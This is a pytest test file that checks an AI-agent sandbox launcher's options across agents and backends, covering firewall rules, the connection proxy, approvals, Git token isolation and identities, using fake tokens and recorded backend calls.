"""Feature matrix: every option family of the launcher, for each agent and backend, checked against what a start
would really do, without a container: the dry-run plan, or a whole start through main() with the backend replaced
by a recorder that keeps the session's config.json, firewall, resolver files, proxy.json and the backend's own
command line.

Each scenario is a small function registered for one feature; the fixture `m` runs it for claude, codex and
opencode on podman and bwrap. Scenarios that only make sense for one agent or backend assert the refusal (and its
message) on the others, so every cell of the matrix checks something concrete. Combinations that interact
(--offline with --allow-*, --no-proxy with --token-proxy, a policy against a project file, --llm with the policy
...) have scenarios of their own.
"""
import importlib.util
import inspect
import json
import os
from pathlib import Path
import re
import stat
import threading
import types

import pytest
import sys

sys.path.insert(0, str(Path(__file__).resolve().parent))
import home_guard  # noqa: E402

home_guard.ensure()  # tests write logins: never into the real HOME, also when conftest.py was not run


ROOT = Path(__file__).resolve().parents[1]
SPEC = importlib.util.spec_from_file_location("sandbox_feature_matrix", ROOT / "sandbox/agent_sandbox.py")
s = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(s)
AGENTS = ("claude", "codex", "opencode")
BACKENDS = ("podman", "bwrap")
COMBOS = [(agent, backend) for agent in AGENTS for backend in BACKENDS]
# The launcher loads its helper modules afresh for every call; once is enough here (they read the environment
# when called, not when loaded), and keeps the matrix fast. (Not the parser: parse_args extends its list defaults.)
CACHED = {name: getattr(s, f"load_{name}_module")() for name in ("privacy", "kits", "approvals", "login", "sessions")}
GITHUB = s.PRESETS["github"]
VPN_PEER = "xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg="
VPN_CONFIG = """[Interface]
PrivateKey = {key}
Address = 10.66.1.2/32, fd00:66::2/128
DNS = 10.66.0.1, fd00:66::1
[Peer]
PublicKey = {peer}
AllowedIPs = 0.0.0.0/0, ::/0
Endpoint = vpn.example.org:51820
"""
TOKEN = "matrix-fixture-token-0123456789"  # shaped like no real provider's token
HOST_ROUTES = ("192.168.1.0/24", "fd17:625c:f037:2::/64")


def address(host):
    """A stable documentation address per host name (TEST-NET-3)."""
    return f"203.0.113.{sum(host.encode()) % 250 + 1}"


def vpn_address(host):
    """The address of a host name as the VPN's resolver answers (another range than the host's own answer)."""
    return f"198.18.7.{sum(host.encode()) % 250 + 1}"


class Started(Exception):
    """Raised by the recorder when a start that should have been refused reached the backend."""


class Matrix:
    """One agent on one backend, with a private host: HOME, XDG directories, tools, /dev and CDI are fakes."""

    def __init__(self, agent, backend, tmp_path, monkeypatch, capsys):
        self.agent, self.backend, self.tmp = agent, backend, tmp_path
        self.monkeypatch, self.capsys = monkeypatch, capsys
        self.work = tmp_path / "work"
        self.work.mkdir()
        self.threads, self.mcp_started = [], []

    # --- starting --------------------------------------------------------------------------------------

    def argv(self, *options, agent_args=()):
        return [self.agent, "--backend", self.backend, "--workspace", str(self.work), "--no-tmux", *options,
                *(["--", *agent_args] if agent_args else [])]

    def plan(self, *options):
        """The dry-run plan (JSON) of a start with OPTIONS."""
        self.capsys.readouterr()
        assert s.launch(self.argv(*options, "--dry-run")) == 0
        return json.loads(self.capsys.readouterr().out)

    def refused(self, *options, match):
        """A start with OPTIONS stops with a ValueError matching MATCH before the backend runs."""
        with pytest.raises(ValueError, match=match):
            self.run(*options)

    def run(self, *options, agent_args=()):
        """A whole start through main(); the backend is a recorder. Returns what the sandbox would get."""
        seen = types.SimpleNamespace()

        def backend(a, session, home):
            seen.a, seen.home = a, home
            seen.config = json.loads((session / "config.json").read_text())
            seen.run_record = json.loads((a.control_dir / "run.json").read_text())  # what `sandbox-ai net` reads
            # What `sandbox-ai devices` and the device watcher read.
            seen.device_grants = json.loads((a.control_dir / "devices.json").read_text())["grants"] \
                if (a.control_dir / "devices.json").exists() else []
            seen.device_rules = json.loads((a.control_dir / "device-rules.json").read_text())
            seen.env = seen.config["env"]
            seen.files = {p.name: p.read_text() for p in session.iterdir() if p.is_file()}
            seen.firewall = seen.files["firewall.nft"]
            proxy_dir = getattr(a, "proxy_dir", None)
            seen.proxy = json.loads((proxy_dir / "proxy.json").read_text()) if proxy_dir else None
            seen.proxy_files = sorted(p.name for p in proxy_dir.iterdir()) if proxy_dir else []
            seen.push = json.loads((proxy_dir / "push.json").read_text()) if "push.json" in seen.proxy_files else None
            seen.home_files = sorted(str(p.relative_to(home)) for p in home.rglob("*") if p.is_file())
            seen.home_text = {str(p.relative_to(home)): p.read_text(errors="replace") for p in home.rglob("*")
                              if p.is_file() and p.stat().st_size < 1 << 20}
            seen.kit_mounts = [(str(src), dest, mode) for src, dest, mode in getattr(a, "kit_mounts", [])]
            # What the read-only kit mounts hold (the staging directory goes with the run).
            seen.kit_entries = {dest: sorted(p.name for p in Path(src).iterdir())
                                for src, dest, _ in getattr(a, "kit_mounts", []) if Path(src).is_dir()}
            auth = home / s.AUTH_TARGETS[self.agent]
            seen.auth = (auth.read_text(), stat.S_IMODE(auth.stat().st_mode)) if auth.exists() else None
            if self.backend == "podman":
                seen.create, seen.command = s.pod_commands(a, "agent-matrix", session, home)
            else:
                a.runtime = []  # the fake agent lies outside the directories --runtime accepts
                seen.command = s.bwrap_command(a, session, home)
                seen.slirp = None if a.offline else s.slirp_command(a, 4242, 9)
            seen.joined = " ".join(map(str, seen.command))
            return 0

        self.monkeypatch.setattr(s, "run_pod" if self.backend == "podman" else "run_bwrap", backend)
        self.monkeypatch.setattr(s, "run_bwrap" if self.backend == "podman" else "run_pod",
                                 lambda *a: (_ for _ in ()).throw(Started("wrong backend")))
        self.capsys.readouterr()
        assert s.main(self.argv(*options, agent_args=agent_args)) == 0
        seen.err = self.capsys.readouterr().err
        return seen

    # --- host fixtures -----------------------------------------------------------------------------------

    def private_file(self, name, text, mode=0o600):
        path = self.tmp / name
        path.write_text(text)
        path.chmod(mode)
        return path

    def project_file(self, document, trust=True):
        document = {"version": 1, "agent": self.agent, **document}
        path = self.work / s.CONFIG_NAME
        path.write_text(json.dumps(document))
        if trust:
            s.trust_config(path)
        return path

    def policy(self, **policy):
        self.monkeypatch.setattr(s, "load_policy", lambda path=None: {"version": 1, **policy})

    def mount(self, src, dest):
        """Bind arguments of the backend's command line for SRC at DEST (podman --mount or bwrap --bind)."""
        return f"src={src},dst={dest}" if self.backend == "podman" else f"{src} {dest}"

    def vpn_profile(self, name="corp", text=None, *tailscale):
        """A VPN profile as `sandbox-ai vpn add` makes it (its keys in the secret files); returns the private key."""
        self.monkeypatch.setenv("SANDBOX_AI_SECRETS", "file")
        key = self.vpn.generate_private_key()
        if text is None and tailscale:
            assert self.vpn.main(["add", name, "--tailscale", *tailscale], out=lambda line: None) == 0
            return None
        source = self.private_file(f"{name}.conf", (text or VPN_CONFIG).format(key=key, peer=VPN_PEER))
        assert self.vpn.main(["add", name, "--wireguard", str(source)], out=lambda line: None) == 0
        return key

    def fake_vpn(self, inside=None, tunnel=None, host=None):
        """The VPN container replaced by a recorder: its podman calls, its command line and standard input, and the
        events it answers with (the tunnel's facts, the checks from inside, the names resolved through it)."""
        record = types.SimpleNamespace(podman=[], containers=[], closed=False)
        vpn = self.vpn
        self.monkeypatch.setattr(vpn, "podman_run", lambda command, **kw: record.podman.append(command)
                                 or types.SimpleNamespace(returncode=0, stdout="", stderr=""))
        facts = {"interface": "wg0", "implementation": "kernel", "ipv4": True, "ipv6": True, "full4": True,
                 "full6": True, "endpoints": ["198.51.100.7:51820"], "dns": ["10.66.0.1", "fd00:66::1"], **(tunnel or {})}
        seen = {"ipv4": {"ip": "185.65.134.10", "vpn": None, "url": "https://api64.ipify.org/?format=json"},
                "ipv6": {"ip": "2a03:1b20::10", "vpn": None, "url": "https://api64.ipify.org/?format=json"},
                "dns": {"servers": facts["dns"], "configured": True, "routes": {d: facts["interface"] for d in facts["dns"]},
                        "answers": {d: True for d in facts["dns"]}, "egress": ["185.65.134.200"]}, **(inside or {})}

        class Tunnel:
            def __init__(self, command, data, say):
                record.containers.append((command, data))
                self.data = data

            def wait_ready(self, timeout=0):
                return {"event": "ready", "tunnel": facts, "checks": seen,
                        "hosts": {name: [vpn_address(name)] for name in self.data["resolve"]}}

            def follow(self, on_event):
                record.follow = on_event

            def close(self):
                record.closed = True
        self.monkeypatch.setattr(vpn, "Tunnel", Tunnel)
        self.monkeypatch.setattr(vpn, "host_baseline", lambda settings: host or {
            "ipv4": "198.18.200.1", "ipv6": "2001:db8:ff::1", "dns_egress": ["198.18.53.53"]})
        return record


@pytest.fixture(params=COMBOS, ids=[f"{agent}-{backend}" for agent, backend in COMBOS])
def m(request, tmp_path, monkeypatch, capsys):
    agent, backend = request.param
    host = tmp_path / "host"
    host.mkdir()
    runtime = tmp_path / "run"
    runtime.mkdir(mode=0o700)
    monkeypatch.setenv("HOME", str(host))
    monkeypatch.setenv("XDG_RUNTIME_DIR", str(runtime))
    for name in ("XDG_DATA_HOME", "XDG_STATE_HOME", "XDG_CONFIG_HOME", "XDG_CACHE_HOME", "CODEX_HOME",
                 "CLAUDE_CONFIG_DIR", "WAYLAND_DISPLAY", "GIT_CONFIG_GLOBAL"):
        monkeypatch.delenv(name, raising=False)
    tools = tmp_path / "bin"
    tools.mkdir()
    for name in AGENTS:
        (tools / name).write_text("#!/bin/sh\nexit 0\n")
        (tools / name).chmod(0o700)
    monkeypatch.setattr(s.shutil, "which", lambda name: str(tools / name) if name in AGENTS else "/usr/bin/" + name)
    monkeypatch.setattr(s.os, "geteuid", lambda: 1000)
    monkeypatch.setattr(s, "has_controlling_terminal", lambda: False)
    monkeypatch.setattr(s, "check_tiocsti", lambda: None)
    # Neither the host's policy nor its logins, DNS or systemd take part.
    monkeypatch.setattr(s, "load_policy", lambda path=None: {})
    monkeypatch.setattr(s, "auth_sources", lambda name: [(host / "no-login.json", s.AUTH_TARGETS[name])])
    monkeypatch.setattr(s, "resolve_hosts", lambda hosts: {h: [address(h)] for h in hosts})
    monkeypatch.setattr(s, "resolve_pod_hosts", lambda a, hosts: {h: [address(h)] for h in hosts})
    monkeypatch.setattr(s, "user_manager_running", lambda: True)
    # The host's routes, for --subnet (the test machine's own stay out).
    monkeypatch.setattr(s, "host_routes", lambda files=None: [s.ipaddress.ip_network(n) for n in HOST_ROUTES])
    monkeypatch.setattr(s, "delegated_controllers", lambda path=None: {"memory", "cpu", "pids"})
    monkeypatch.setattr(s.os, "cpu_count", lambda: 8)
    for name, module in CACHED.items():
        monkeypatch.setattr(s, f"load_{name}_module", lambda module=module: module)
    matrix = Matrix(agent, backend, tmp_path, monkeypatch, capsys)
    # Approval watchers and MCP servers are recorded, not started.
    real_thread = threading.Thread

    def thread(*args, target=None, **kwargs):
        matrix.threads.append(getattr(target, "__name__", str(target)))
        return real_thread(target=lambda *a: None, daemon=True)
    monkeypatch.setattr(s.threading, "Thread", thread)
    mcp = s.load_mcp_module()
    monkeypatch.setattr(mcp, "ensure_running", lambda name, a: matrix.mcp_started.append(name))
    monkeypatch.setattr(s, "load_mcp_module", lambda: mcp)
    matrix.vpn = s.load_vpn_module()  # it sees this launcher (with the fakes above) as its own
    monkeypatch.setattr(s, "load_vpn_module", lambda: matrix.vpn)
    return matrix


def scenarios():
    """A registry of scenario functions; `register` is the decorator, the dict maps id -> function."""
    table = {}

    def register(function):
        table[function.__name__.replace("_", "-")] = function
        return function
    return table, register


def provider(m):
    return s.PROVIDERS[m.agent]


# --- network presets and allow options ------------------------------------------------------------------

NETWORK, network = scenarios()


@network
def defaults(m):
    plan = m.plan()
    assert plan["https_hosts"] == provider(m) and plan["nameservers"] == [] and plan["proxy"]["enabled"]
    run = m.run()
    for host in provider(m):
        assert f"{address(host)} {host}" in run.files["hosts"]
        assert f"ip daddr {address(host)} tcp dport 443 accept" in run.firewall
    assert "dport 53" not in run.firewall and "\n  accept\n" not in run.firewall
    assert "redirect to :" in run.firewall  # every TCP connection passes the proxy
    if m.backend == "podman":
        assert run.create[run.create.index("--network") + 1] == s.POD_NETWORK


@network
def offline(m):
    plan = m.plan("--offline")
    assert plan["https_hosts"] == [] and plan["offline"] and not plan["proxy"]["enabled"]
    run = m.run("--offline")
    assert run.proxy is None and run.config["proxy"] is None and not run.config["ask"]
    assert "tcp dport 443 accept" not in run.firewall and "redirect" not in run.firewall
    assert not any(name in run.env for name in s.CA_BUNDLE_VARIABLES)
    if m.backend == "podman":
        assert run.create[run.create.index("--network") + 1] == "none"


@network
def profile_offline_equals_offline(m):
    assert m.plan("--profile", "offline")["https_hosts"] == [] and m.plan("--profile", "offline")["offline"]


@network
def profile_development(m):
    hosts = m.plan("--profile", "development")["https_hosts"]
    assert hosts == list(dict.fromkeys(provider(m) + s.FRONTIER + s.PRESETS["pypi"] + GITHUB))


@network
def profile_frontier_and_flag_agree(m):
    assert m.plan("--profile", "frontier")["https_hosts"] == m.plan("--frontier")["https_hosts"] \
        == list(dict.fromkeys(provider(m) + s.FRONTIER))


@network
def profile_dns(m):
    plan = m.plan("--profile", "dns")
    assert plan["nameservers"] == s.DEFAULT_NAMESERVERS and plan["https_hosts"] == provider(m)
    run = m.run("--profile", "dns")
    assert all(f"ip daddr {ns} udp dport 53 accept" in run.firewall for ns in s.DEFAULT_NAMESERVERS)
    assert run.files["resolv.conf"] == "".join(f"nameserver {ns}\n" for ns in s.DEFAULT_NAMESERVERS)


@network
def nameserver_replaces_defaults(m):
    run = m.run("--dns", "--nameserver", "9.9.9.9")
    assert run.files["resolv.conf"] == "nameserver 9.9.9.9\n"
    assert "ip daddr 9.9.9.9 tcp dport 53 accept" in run.firewall and "1.1.1.1" not in run.firewall


@network
def egress_all(m):
    plan = m.plan("--profile", "egress-all")
    assert plan["egress_all_allow"] and plan["nameservers"] == s.DEFAULT_NAMESERVERS
    run = m.run("--egress-all-allow")
    assert "\n  accept\n" in run.firewall and run.proxy["allow"]["all"] is True


@network
def presets(m):
    for preset in sorted(s.PRESETS):
        option = f"--allow-{preset}"
        assert m.plan(option)["https_hosts"] == list(dict.fromkeys(provider(m) + s.PRESETS[preset])), option


@network
def explicit_only(m):
    plan = m.plan("--no-provider-defaults", "--allow-host", "example.org")
    assert plan["https_hosts"] == ["example.org"]
    run = m.run("--no-provider-defaults", "--allow-host", "example.org")
    assert f"ip daddr {address('example.org')} tcp dport 443 accept" in run.firewall
    assert not any(address(h) in run.firewall for h in provider(m) if address(h) != address("example.org"))


@network
def allow_networks_and_tcp(m):
    run = m.run("--allow", "10.1.2.0/24", "--allow-tcp", "192.0.2.7:5432", "--allow-tcp", "[2001:db8::7]:22")
    assert "ip daddr 10.1.2.0/24 accept" in run.firewall
    assert "ip daddr 192.0.2.7 tcp dport 5432 accept" in run.firewall
    assert "ip6 daddr 2001:db8::7 tcp dport 22 accept" in run.firewall
    assert run.proxy["allow"]["nets"] == ["10.1.2.0/24"]
    assert run.proxy["ssh"]["allowed_tcp"] == [["192.0.2.7", 5432], ["2001:db8::7", 22]]


@network
def host_port_is_podman_only(m):
    if m.backend == "bwrap":
        m.refused("--allow-host-port", "11434", match="--allow-host-port needs the Podman backend")
        return
    run = m.run("--allow-host-port", "11434", "--allow-host-port", "3080")
    network_value = run.create[run.create.index("--network") + 1]
    assert "-T,3080,-T,11434" in network_value and "-T,none" not in network_value
    assert "tcp dport != { 3080, 11434 } return" in run.firewall
    assert "127.0.0.1:3080 in the sandbox reaches port 3080" in run.err


@network
def named_network_and_static_ip(m):
    if m.backend == "bwrap":
        m.refused("--network", "lab", "--ip", "10.89.0.5", match="apply only to Podman")
        return
    run = m.run("--network", "lab", "--ip", "10.89.0.5", "--ip6", "fd00::5")
    assert run.create[run.create.index("--network") + 1] == "lab"
    assert run.create[run.create.index("--ip") + 1] == "10.89.0.5" and "--ip6" in run.create
    m.refused("--network", "lab", "--allow-host-port", "8080", match="--allow-host-port needs the Podman backend")


@network
def static_ip_needs_network(m):
    m.refused("--ip", "10.89.0.5", match="Static IP requires --network")
    m.refused("--network", "host", match="Use a named Podman network, not a special network mode")


@network
def offline_conflicts(m):
    for options in (["--allow-host", "example.org"], ["--allow-github"], ["--allow", "10.0.0.0/8"],
                    ["--allow-tcp", "192.0.2.1:22"], ["--dns"], ["--nameserver", "9.9.9.9"], ["--egress-all-allow"],
                    ["--frontier"], ["--profile", "development"], ["--allow-host-port", "3000"]):
        m.refused("--offline", *options, match="--offline conflicts with network permissions")
    # The profile is --offline too.
    m.refused("--profile", "offline", "--allow-pypi", match="--offline conflicts")


@network
def invalid_values(m):
    m.refused("--allow-host", "exa mple.org", match="Invalid hostname")
    m.refused("--allow-tcp", "192.0.2.1", match="--allow-tcp expects IP:PORT")
    m.refused("--nameserver", "fe80::1%eth0", match="scope ID")


# --- connection proxy -------------------------------------------------------------------------------------

PROXY, proxy = scenarios()


@proxy
def proxy_on_by_default(m):
    run = m.run()
    assert run.proxy["port"] == s.PROXY_PORT and run.proxy["push_check"] and run.proxy["no_inspect"] == []
    assert run.config["proxy"]["log"].startswith("connections-") and "push.json" in run.proxy_files
    assert all(run.env[name] == str(s.CA_DIR / "bundle.pem") for name in s.CA_BUNDLE_VARIABLES)
    assert run.env["NODE_EXTRA_CA_CERTS"] == str(s.CA_DIR / "ca.pem")
    assert str(s.PROXY_DIR) in run.joined
    # The connection log goes to the per-project default outside the workspace.
    assert run.a.log_dir.is_relative_to(Path(os.environ["HOME"]) / ".local/state/sandbox-ai/logs")


@proxy
def no_proxy(m):
    plan = m.plan("--no-proxy")
    assert not plan["proxy"]["enabled"] and plan["proxy"]["log_dir"] is None and plan["log_dir"] is None
    run = m.run("--no-proxy")
    assert run.proxy is None and "redirect" not in run.firewall and str(s.PROXY_DIR) not in run.joined
    assert not run.config["ask"] and "BROWSER" not in run.env and not any(n in run.env for n in s.CA_BUNDLE_VARIABLES)
    # Pushes are then checked by the agent's hooks only.
    assert ("core.hooksPath", s.PRIVACY_HOOKS) in git_config(run.env)


def git_config(env):
    """The GIT_CONFIG_* entries of ENV, in order: [(key, value)]."""
    return [(env[f"GIT_CONFIG_KEY_{i}"], env[f"GIT_CONFIG_VALUE_{i}"]) for i in range(int(env.get("GIT_CONFIG_COUNT", 0)))]


@proxy
def no_inspect(m):
    run = m.run("--no-inspect", "Example.ORG", "--no-inspect", "*.corp.example")
    assert run.proxy["no_inspect"] == ["example.org", "*.corp.example"]
    assert m.plan("--no-inspect", "example.org")["proxy"]["no_inspect"] == ["example.org"]


@proxy
def no_inspect_of_a_public_git_host_needs_privacy_check_off(m):
    m.refused("--no-inspect", "github.com", match="would let pushes to github.com pass unchecked")
    m.refused("--no-inspect", "*.gitlab.com", match="gitlab.com")
    run = m.run("--no-inspect", "github.com", "--privacy-check", "off")
    assert run.proxy["no_inspect"] == ["github.com"] and not run.proxy["push_check"]
    assert "push.json" not in run.proxy_files and not run.proxy["ssh"]["block"]


@proxy
def allow_http_rules(m):
    run = m.run("--allow-host", "api.example.org", "--allow-http", "api.example.org GET,HEAD /repos/**")
    rule = run.proxy["http_rules"][0]
    assert rule["host"] == "api.example.org" and rule["methods"] == ["GET", "HEAD"]
    assert rule["addresses"] == [address("api.example.org")]


@proxy
def proxy_only_options_without_proxy(m):
    for switch in (["--no-proxy"], ["--offline"]):
        m.refused(*switch, "--allow-http", "example.org GET /", match="--allow-http needs the connection proxy")
        m.refused(*switch, "--token-proxy", match="--token-proxy needs the connection proxy")


@proxy
def privacy_check_modes(m):
    for mode, push in (("public", True), ("always", True), ("off", False)):
        run = m.run("--privacy-check", mode)
        assert run.proxy["push_check"] is push and run.proxy["ssh"]["block"] is push
        assert (("core.hooksPath", s.PRIVACY_HOOKS) in git_config(run.env)) is push
        assert ("push.json" in run.proxy_files) is push and (run.push or {}).get("mode") == (mode if push else None)


# --- approvals (--ask) -------------------------------------------------------------------------------------

APPROVALS, approvals = scenarios()


@approvals
def ask_on_by_default(m):
    run = m.run()
    assert run.config["ask"] is True and run.config["ask_max_scope"] == "always"
    assert run.env["BROWSER"] == "/sandbox/session/bin/xdg-open" and run.env["PATH"].startswith("/sandbox/session/bin:")
    assert {"watch", "serve_browser"} <= set(m.threads)
    assert str(s.BROWSER_DIR) in run.joined


@approvals
def ask_off(m):
    run = m.run("--ask", "off")
    # No approval watchers; the threads are the canaries' (on by default) and the activity timeline's (the default
    # log directory is used).
    # (the memory watch runs as always: it asks nothing)
    threads = [name for name in m.threads if name != "watch_memory"]
    assert run.config["ask"] is False and "BROWSER" not in run.env and threads == ["follow", "collect"]
    assert run.proxy is not None  # the proxy still runs; it just refuses instead of asking
    assert str(s.BROWSER_DIR) not in run.joined


@approvals
def no_questions_without_the_proxy(m):
    for options in (["--no-proxy"], ["--offline"]):
        run = m.run(*options)
        assert run.config["ask"] is False and set(m.threads) - {"watch_memory"} == {"follow"}, options  # the canaries' only


@approvals
def remembered_approvals_join_the_options(m):
    approved = Path(os.environ["HOME"]) / ".config/sandbox-ai/approved.json"
    approved.parent.mkdir(parents=True)
    approved.write_text(json.dumps({str(m.work): {"hosts": ["remembered.example"], "tcp": ["192.0.2.9:8443"]}}))
    approved.chmod(0o600)
    plan = m.plan()
    assert "remembered.example" in plan["https_hosts"] and "192.0.2.9:8443" in plan["allow_tcp"]
    # Approved, not chosen: no SSH there.
    run = m.run()
    assert run.proxy["ssh"]["allowed_tcp"] == [] and "allowed because you approved them always" in run.err
    # Below "always" the policy keeps them out.
    m.policy(max_approval_scope="run")
    assert "remembered.example" not in m.plan()["https_hosts"]
    assert m.run().config["ask_max_scope"] == "run"


# --- Git tokens, --token-proxy and identity ---------------------------------------------------------------

GIT, git = scenarios()


@git
def token_env_in_the_sandbox(m):
    m.monkeypatch.setenv("GH_PAT", TOKEN)
    plan = m.plan("--git-token-env", "https://github.com=GH_PAT")
    assert plan["git_credentials"] == [{"url": "https://github.com", "user": "x-access-token", "env": "GH_PAT"}]
    assert set(GITHUB) <= set(plan["https_hosts"])  # implied --allow-github
    run = m.run("--git-token-env", "https://github.com=GH_PAT")
    assert run.env["SANDBOX_GIT_TOKEN_0"] == run.env["GH_TOKEN"] == TOKEN
    # The run's helper for logins added during the run comes first; the start's login after it (and wins).
    keys = [key for key, _ in git_config(run.env)]
    assert keys[:2] == ["credential.helper", "credential.https://github.com.helper"] and run.proxy["git_tokens"] == []
    assert TOKEN not in run.err and TOKEN not in json.dumps(plan)


@git
def token_proxy_keeps_the_token_out(m):
    m.monkeypatch.setenv("GH_PAT", TOKEN)
    run = m.run("--git-token-env", "https://github.com=GH_PAT", "--token-proxy")
    assert TOKEN not in json.dumps(run.config) and "GH_TOKEN" not in run.env
    assert not any(key.startswith("SANDBOX_GIT_TOKEN") for key in run.env)
    assert run.proxy["git_tokens"] == [{"host": "github.com", "port": 443, "user": "x-access-token", "loopback": False,
                                        "token": TOKEN}]
    assert TOKEN not in "\n".join(run.home_files) and TOKEN not in run.err


def git_login(m, url, secret="GITEA", token=TOKEN, user="alice"):
    """A login of sandbox-ai git-logins with its token in the secrets (files)."""
    m.monkeypatch.setenv("SANDBOX_AI_SECRETS", "file")
    if token is not None:
        s.load_secret_store_module().store().set(secret, token)
    assert s.load_git_logins_module().main(["add", url, "--secret", secret, "--user", user], out=lambda line: None) == 0


@git
def git_logins_reach_the_proxy_never_the_agent(m):
    """sandbox-ai git-logins: every run's proxy adds them; the agent's sandbox holds no token, no helper for it."""
    git_login(m, "http://localhost:3080")
    plan = m.plan("--allow-host-port", "3080") if m.backend == "podman" else m.plan()
    assert plan["git_logins"] == [{"url": "http://localhost:3080", "user": "alice"}]
    run = m.run(*(["--allow-host-port", "3080"] if m.backend == "podman" else []))
    assert run.proxy["git_tokens"] == [{"host": "localhost", "port": 3080, "user": "alice", "loopback": True,
                                        "token": TOKEN}]
    assert TOKEN not in json.dumps(run.config) and TOKEN not in run.err and TOKEN not in "\n".join(run.home_files)
    assert not any(key.startswith("SANDBOX_GIT_TOKEN") for key in run.env)
    # Off for a start, or without the proxy: nothing.
    assert m.run("--git-logins", "off").proxy["git_tokens"] == []
    assert m.plan("--no-proxy")["git_logins"] == []


@git
def an_identity_replaces_the_default_logins_and_commit_name(m):
    """--identity NAME: its commit name and address, its Git logins instead of git-logins', its publish logins;
    an identity without logins has none at all (an investigation's sandbox carries none of your accounts)."""
    git_login(m, "https://github.com", secret="GH_DEFAULT", token="ghp_" + "d" * 36)  # the identity default
    store = s.load_secret_store_module().store()
    store.set("GH_C0DECAVE", "ghp_" + "c" * 36)
    store.set("PYPI_C0DECAVE", "pypi-c0decave-token")
    m.monkeypatch.setattr(s, "_identities_module", None)
    module = s.load_identities_module()
    for argv in (["add", "c0decave", "--name", "dash", "--email", "c0decave@users.noreply.github.com"],
                 ["login", "c0decave", "https://github.com", "--secret", "GH_C0DECAVE", "--user", "c0decave"],
                 ["publish", "c0decave", "pypi", "--secret", "PYPI_C0DECAVE"], ["add", "investigation"]):
        assert module.main(argv, out=lambda line: None) == 0
    run = m.run("--identity", "c0decave", "--publish", "pypi")
    pairs = {run.env[f"GIT_CONFIG_KEY_{i}"]: run.env[f"GIT_CONFIG_VALUE_{i}"]
             for i in range(int(run.env["GIT_CONFIG_COUNT"]))}
    assert pairs["user.name"] == "dash" and pairs["user.email"] == "c0decave@users.noreply.github.com"
    assert [(t["host"], t["user"], t["token"]) for t in run.proxy["git_tokens"]] == [
        ("github.com", "c0decave", "ghp_" + "c" * 36)]  # the identity's, not default's
    assert [(e["host"], e["key"]) for e in run.proxy["api_keys"]] == [("upload.pypi.org", "pypi-c0decave-token")]
    assert "ghp_" not in json.dumps(run.env) and "pypi-c0decave-token" not in json.dumps(run.env)
    plan = m.plan("--identity", "c0decave")
    assert plan["identity"] == {"name": "c0decave", "commit_name": "dash",
                                "commit_email": "c0decave@users.noreply.github.com", "git": ["https://github.com"],
                                "publish": ["pypi"]}
    assert plan["git_logins"] == [{"url": "https://github.com", "user": "c0decave"}]
    # The investigation's sandbox: no login at all, though default has one.
    bare = m.run("--identity", "investigation")
    assert bare.proxy["git_tokens"] == [] and "user.name" not in json.dumps(bare.env)
    m.refused("--identity", "investigation", "--publish", "pypi",
              match="identity investigation has no login for it; add one with: sandbox-ai identities publish")
    # Without --identity: default, as before.
    assert [t["user"] for t in m.run().proxy["git_tokens"]] == ["alice"]
    m.refused("--identity", "nobody", match="no such identity")
    m.refused("--identity", "c0decave", "--git-identity", match="drop --git-identity")


@git
def a_start_option_wins_over_git_logins_for_its_server(m):
    git_login(m, "https://github.com", secret="GH_LOGIN", token="ghp_" + "b" * 36)
    git_login(m, "https://git.example.org", secret="OTHER", token="glpat-" + "c" * 20)
    m.monkeypatch.setenv("GH_PAT", TOKEN)
    run = m.run("--git-token-env", "https://github.com=GH_PAT", "--allow-host", "git.example.org")
    # github.com: the start's token, for the agent (as before); git.example.org: the login, in the proxy.
    assert run.env["SANDBOX_GIT_TOKEN_0"] == TOKEN
    assert [(t["host"], t["token"]) for t in run.proxy["git_tokens"]] == [("git.example.org", "glpat-" + "c" * 20)]


@git
def a_login_whose_secret_is_missing_is_left_out_and_said(m):
    git_login(m, "https://git.example.org", secret="NOT_KEPT", token=None)
    run = m.run("--allow-host", "git.example.org")
    assert run.proxy["git_tokens"] == [] and "no usable secret NOT_KEPT" in run.err


@git
def token_file_other_host(m):
    token = m.private_file("token", TOKEN + "\n")
    plan = m.plan("--git-token-file", f"https://git.example.org={token}")
    assert "git.example.org" in plan["https_hosts"] and plan["git_credentials"][0]["file"] == str(token)
    loose = m.private_file("loose", TOKEN, mode=0o644)
    m.refused("--git-token-file", f"https://git.example.org={loose}", match="must belong to you and be private")


@git
def token_proxy_refusals(m):
    m.monkeypatch.setenv("GITEA", TOKEN)
    m.refused("--git-token-env", "http://git.example.org=GITEA", match="plain http would send the token unencrypted")
    # Plain http is for the host's loopback only (Podman); there the proxy adds the token to that port only.
    if m.backend == "podman":
        run = m.run("--token-proxy", "--git-token-env", "http://localhost:3080=GITEA")
        assert run.proxy["git_tokens"] == [{"host": "localhost", "port": 3080, "user": "x-access-token",
                                            "loopback": True, "token": TOKEN}] and TOKEN not in json.dumps(run.env)
    else:
        m.refused("--token-proxy", "--git-token-env", "http://localhost:3080=GITEA", match="only the Podman backend")
    login = ":".join(("alice", TOKEN))  # git-credential-store line: https://USER:TOKEN@HOST
    credentials = m.private_file("git-credentials", f"https://{login}@git.example.org\n")
    m.refused("--token-proxy", "--git-credentials", str(credentials), match="not --git-credentials")
    m.refused("--no-proxy", "--token-proxy", "--git-token-env", "https://github.com=GITEA",
              match="needs the connection proxy")
    m.refused("--offline", "--git-token-env", "https://github.com=GITEA", match="Git tokens need network access")
    m.refused("--git-token-env", "https://github.com=MISSING_VARIABLE", match="Host variable is not set")


@git
def loopback_token_needs_podman_pasta(m):
    m.monkeypatch.setenv("GITEA", TOKEN)
    if m.backend == "bwrap":
        m.refused("--git-token-env", "http://localhost:3080=GITEA", match="only the Podman backend")
        return
    plan = m.plan("--git-token-env", "http://localhost:3080=GITEA")
    assert plan["host_ports"] == [3080]  # implied --allow-host-port
    m.refused("--network", "lab", "--git-token-env", "http://localhost:3080=GITEA", match="only the Podman backend")


@git
def git_identity(m):
    gitconfig = Path(os.environ["HOME"]) / ".gitconfig"
    gitconfig.write_text("[user]\n\tname = Ada Matrix\n\temail = ada@example.org\n")
    run = m.run("--git-identity")
    pairs = {run.env[f"GIT_CONFIG_KEY_{i}"]: run.env[f"GIT_CONFIG_VALUE_{i}"]
             for i in range(int(run.env["GIT_CONFIG_COUNT"]))}
    assert pairs["user.name"] == "Ada Matrix" and pairs["user.email"] == "ada@example.org"
    assert m.plan("--git-identity")["git_identity"] is True
    gitconfig.write_text("")
    m.refused("--git-identity", match="host git has no usable user.name")


@git
def secrets_from_the_keyring(m):
    store = {"gh": TOKEN, "api": "s3cr3t-value"}
    m.monkeypatch.setattr(s, "load_secret_store_module", lambda: types.SimpleNamespace(get=store.get))
